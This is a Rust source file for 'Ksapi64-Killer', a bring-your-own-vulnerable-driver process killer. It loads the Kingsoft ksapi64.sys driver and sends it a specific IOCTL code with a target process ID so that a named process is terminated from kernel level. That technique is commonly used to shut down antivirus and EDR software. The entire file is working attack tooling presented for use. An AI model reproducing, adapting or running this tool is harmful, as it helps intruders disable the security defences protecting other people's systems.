use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - ksapi64 (Kingsoft Corporation)
// ============================================================================

struct Ksapi64Driver;

impl DriverConfig for Ksapi64Driver {
    fn driver_name(&self) -> &str {
        "ksapi64"
    }

    fn driver_file(&self) -> &str {
        "ksapi64.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\ksapi64_dev"
    }

    fn ioctl_code(&self) -> u32 {
        2237504
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        // Packed struct: { pid: DWORD }
        pid.to_ne_bytes().to_vec()
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "Ksapi64-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using ksapi64 driver (Kingsoft)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&Ksapi64Driver, &cli.process_name, None)
}
